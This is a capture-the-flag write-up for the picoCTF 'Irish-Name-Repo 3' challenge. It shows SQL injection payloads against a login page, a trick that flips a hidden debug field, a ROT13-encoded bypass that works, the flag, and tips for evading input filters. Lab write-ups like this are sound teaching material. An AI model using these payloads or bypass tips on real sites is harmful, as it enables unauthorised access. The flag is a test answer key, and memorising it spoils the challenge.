# Irish-Name-Repo 3

### Description:
Try to see if you can login as admin!
Additional details will be available after launching your challenge instance.
"Click `Launch Instance`."
http://fickle-tempest.picoctf.net:64558

Hint: Seems like the password is encrypted.

### Commands / Steps:

```bash
# Step 1: Visit the website in your browser.

# Step 2: Navigate to the login page.

# Step 3: There's one input field which is for password. Let's try various SQL injection methods to get clues.

# Step 4: Fitst, I tried putting the ' (apostrophe) in the password field and got this result back. 
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'''" in /var/www/html/login.php on line 20

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21 Stack trace: #0 {main} thrown in /var/www/html/login.php on line 21

# Step 5: Then tried this:  ' OR '1'='1' --
Warning: SQLite3::query(): Unable to prepare statement: 1, near "BE": syntax error in /var/www/html/login.php on line 20

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21 Stack trace: #0 {main} thrown in /var/www/html/login.php on line 21

# Step 6: I also tried other method too, but they all didn't work. I suspect there being some changes made to the password's input before it's sent to the server. The hint also says that the password is encrypted.

# Step 7: Let's check the source code of the login page from the browser's developer tools. We can see the hidden debug mode in the source code on line 25.
<input type="hidden" name="debug" value="0">

# Step 8: Now I'll type in the ' OR '1'='1' -- again and before clicking the "Login" button, I will edit the source code debug value to "1". 
password: ' OR 1=1 -- 
SQL query: SELECT * FROM admin where password = '' BE 1=1 -- '

Warning: SQLite3::query(): Unable to prepare statement: 1, near "BE": syntax error in /var/www/html/login.php on line 20

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21 Stack trace: #0 {main} thrown in /var/www/html/login.php on line 21

# Step 9: So that explain the error we got before and the hint given to us. This is ROT13 encryption because the ROT13 of "OR" is equal to "BE". So we will get the flag if we use this information. Let's put this in the input field: ' BE 1=1 --
```

### Flag:

> picoCTF{3v3n_m0r3_SQL_2af58a67}

### Notes / Tips

- **ROT13**: Simple cipher that shifts each letter 13 positions (A→N, B→O, etc.). ROT13("OR") = "BE"
- **Hidden form fields**: Check HTML source for debug/admin flags set to "0" that can be changed to bypass filters
- **Input obfuscation**: If direct SQL injection fails, test if input is being encoded (Base64, ROT13, etc.) before execution
- **Browser DevTools**: Use F12 → Elements to edit HTML and change hidden values before form submission
- **Error messages**: Pay attention to SQL errors—they reveal what the query actually looks like after transformations 


